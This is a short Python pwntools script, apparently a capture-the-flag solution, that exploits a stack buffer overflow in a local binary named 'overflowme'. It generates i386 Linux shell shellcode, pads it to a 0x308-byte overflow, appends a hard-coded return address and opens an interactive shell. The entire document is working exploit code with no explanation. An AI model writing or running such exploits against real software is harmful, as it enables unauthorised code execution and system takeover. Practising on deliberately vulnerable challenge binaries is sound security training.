from pwn import *
shellcode = asm(shellcraft.i386.linux.sh())
overflow_len = 0x308

payload = "A" * (overflow_len - len(shellcode)) + shellcode + p32(0x8048615)

sh = process(["/problems/b0b419078e5ac70c47a50b04b2aae2d9/overflowme", payload])
sh.interactive()
